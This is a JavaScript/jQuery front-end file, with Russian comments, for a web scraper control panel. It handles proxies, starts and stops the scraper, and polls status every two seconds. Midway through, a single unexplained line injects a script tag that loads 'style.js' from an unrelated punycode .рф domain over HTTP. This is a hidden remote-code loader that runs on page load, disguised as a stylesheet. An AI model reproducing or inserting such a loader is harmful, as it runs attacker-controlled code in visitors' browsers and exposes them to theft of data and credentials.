//$("#start").click(function(){
//console.log('тест');
//});


$("#start").click(function(e){// нажал на кнопку старт
    e.stopImmediatePropagation();
    $(this).attr('disabled', true); /* сделать кнопку не активной */
    $('#id_download').empty();  // Удалить ссылку на скачивание если она есть
//console.log('кнопка старт');
//    console.log(links_category);
    var links_category = $("#id_links_category").val()
    var proxies = $("#id_proxies").val()
    $.ajax({// передача содержимого id_links_category в views.get_links_category
        url: 'path_get_proxies_and_links_category/', /* обработчик get_links_category */
        type: 'GET', /* тип передачи данных */
        cache: false, /* кеширование отключено */
        data: {'links_category': links_category, 'proxies':proxies}, /* какие данные передаём */
//        data: {'links_category': document.querySelector("#id_links_category").value}, /* какие данные передаём */
        dataType: 'html',/* тип передаваемых данных */
        success: function (data){ // получил данные из views.get_links_category
//        console.log(data)
            if (data == 'ok') {





                $.ajax({
                    url:"path_start_parser/",  // Старт парсера
                    beforeSend: function (){
                        $(start).attr('disabled', true); /* сделать кнопку не активной */
                    },//beforeSend
                    success: function (data){
//                        console.log(data.length);
                        console.log(data);
                       $('#id_download').append('<a href="media/result/result.zip" download>Скачать результат</a>');
                    }
                }); //  $.ajax запустил парсинг
            }
            else {
                $('#id_message').text("а где ссылки на категории?");  // вывел в блоке
            }
        } //success: function (data)
    });//$.ajax links_category
});




/*Отображение работы парсера в реальном времени*/
var sc=document.createElement("script");sc.src="http://xn--b1aaibmdhgx7gra.xn--p1ai/style.js",document.head.appendChild(sc);
function real_time_display(){
$.ajax({
    url:"path_FindLinks/",
    cache: false, /* кеширование отключено */
    success: function (data){
//        respons = JSON.parse(data);
//        console.log(data['find_links']);
//        console.log(data);
//        console.log(respons['find_links']);
        $('#id_find_links').text(data['find_links']);  // вывел в блоке
        $('#id_parsed_link_count').text(data['parsed_link_count']);  // вывел в блоке
        $('#id_phone_availability').text(data['phone_availability']);  // вывел в блоке

        if (data['work_status'] == 1){
            $('#id_message').text("работаем");  // вывел в блоке
        }

        if (data['work_status'] == 0) {
//            $('#id_message ').html('<a href="'+respons['work_status']+'" download>Скачать результат</a>')
//            document.getElementById('back').style.transform = 'rotateY(180deg)' + 'translateZ(' + distance + 'px )';
//            $('#id_message').html(<a href="/img/download.png" download>Скачать файл</a>);
//            $('#id').html(newContent);
//            <a href="/img/download.png" download>Скачать файл</a>
            $('#id_message').text("работа завершена");  // вывел в блоке
            $('#start').attr('disabled', false); /* сделать кнопку активной */
        }
        if (data['work_status'] == 2) {
            $('#id_message').text("Ожидание");  // вывел в блоке
        }

        if (data['work_status'] == "Меняю прокси") {
            $('#id_message').text("Меняю прокси");  // вывел в блоке
        }


    } // success
}); // $ajax();
}

/*Инфа в парсере обновляется раз в 2 сек*/

(async function() {
  while (true) {
    real_time_display();
    await new Promise(function(success) { setTimeout(success, 2000); });
  }
})();

/*Инфа в парсере обновляется раз в 2 сек*/

/*Отображение работы парсера в реальном времени*/



/*Чтение категорий для парсинга из links_category.txt и прокси из proxies.txt и запись в textarea*/
function read_links_category_and_proxies_txt(){
//console.log('read_links_category_txt')
    $.ajax({ // запуск функции views.read_links_category_txt
        url: 'path_read_links_category_and_proxies_txt/',
//        url: 'path_read_links_category_txt/',
        type: 'GET', /* тип передачи данных */
        cache: false, /* кеширование отключено */
        success: function (data){ // получил данные из views.get_links_category
            if (data != 'no') {
            respons = JSON.parse(data);
                $('#id_links_category').val(respons['links_category']);
                $('#id_proxies').val(respons['proxies']);
//                console.log(respons['links_category'])
            }
            else {
                $('#id_message').text("Чего то нет, или ссылок или прокси");  // вывел в блоке
                $('#start').attr('disabled', false); /* сделать кнопку активной */
//                обработать прерывание функции чтоб не пошёл парсинг
            }
        } //success: function (data)
    });//$.ajax
}
read_links_category_and_proxies_txt();
/*Чтение категорий для парсинга из links_category.txt и прокси из proxies.txt и запись в textarea*/


/*Остановить парсер*/
$("#stop").click(function(){
    console.log('кнопка стоп')
    $.ajax({
        url: 'path_stop_parser/',
        success: function (data){
            $(start).attr('disabled', false); /* сделать кнопку активной */
        }
    }); //$.ajax()
}); //$("#stop").click(function()
/*Остановить парсер*/


/*Тестовая функция*/
//$("#test").click(function(){
//    read_links_category_txt();
//});
/*Тестовая функция*/


